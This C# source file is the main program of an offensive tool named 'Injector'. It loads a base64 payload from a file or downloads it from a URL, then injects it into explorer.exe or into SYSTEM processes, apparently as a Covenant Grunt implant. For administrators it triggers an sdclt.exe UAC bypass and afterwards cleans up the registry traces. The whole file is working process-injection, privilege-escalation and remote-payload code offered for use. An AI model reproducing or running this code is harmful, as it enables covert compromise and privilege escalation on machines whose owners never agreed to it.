using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using Injector.ShellInject;
using System.Collections.Generic;
using Injector.Enumeration;
using Injector.UACBypass;
using Injector.Execution;
using Injector.Misc;
	

	

namespace Injector
{
    class Program
    {

        static int Main(string[] args)
        {
            if (args.Length < 2 || (args[0] != "-w" && args[0] != "-f"))
            {
                Console.WriteLine("Insufficient Arguments -> need either -w or -f to identify payload");
                return 1;
            }

            if (args.Length < 3)
            {
                int processID = EnumerateProcesses.GetExplorerProcceses(Environment.UserName);
                string b64payload = "";
                if (args[0] == "-f")
                {
                    try
                    {
                        b64payload = File.ReadAllText(args[1]);
                    }
                    catch
                    {
                        Console.WriteLine("error opeening file");
                        return 1;
                    }
                }
                else if (args[0] == "-w")
                {
                    try
                    {
                        b64payload = Utilities.downloadpayload(args[1]);
                    }
                    catch
                    {
                        Console.WriteLine("error downloading file contents");
                        return 1;
                    }

                }

                if (processID != 0)
                {
                    try
                    {
                        GruntInjector.Inject(processID, b64payload);
                        if (UserChecks.IsAdministrator())
                        {
                            sdclt.bypass(args[0] + " " + args[1]);
                            ShellComannd.ShellCmdExecute("sdclt.exe");
                        }
                        else
                        {
                            Console.WriteLine("Not Local Admin");
                        }
                    }
                    catch
                    {
                        Console.WriteLine("Error Injecting Under Explorer");
                    }

                }
                return 0;
            }
            else
            {
                List<int> SystemProcessList = EnumerateProcesses.GetSystemProcesses();
                string b64payload = "";
                if (args[0] == "-f")
                {
                    try
                    {
                        b64payload = File.ReadAllText(args[1]);
                    }
                    catch
                    {
                        Console.WriteLine("error opeening file");
                        return 1;
                    }
                }
                else if (args[0] == "-w")
                {
                    try
                    {
                        b64payload = Utilities.downloadpayload(args[1]);
                    }
                    catch
                    {
                        Console.WriteLine("error downloading file contents");
                        return 1;
                    }

                }

                foreach (int process in SystemProcessList)
                {
                    try
                    {

                        Console.WriteLine("Trinying PID: " + process);
                        GruntInjector.Inject(process, b64payload);
                        sdclt.Cleanup();
                        Console.WriteLine("Injected Under PID: " + process);
                        System.Threading.Thread.Sleep(50000);
                        return 0;

                    }
                    catch
                    {

                    }
                    
                }

                Console.WriteLine("Couldn't find a system process to inject under :(");
                sdclt.Cleanup();
                Console.WriteLine("Cleaning up Reg and exiting.....");
                System.Threading.Thread.Sleep(50000);
                return 1;

            }
        }
    }
}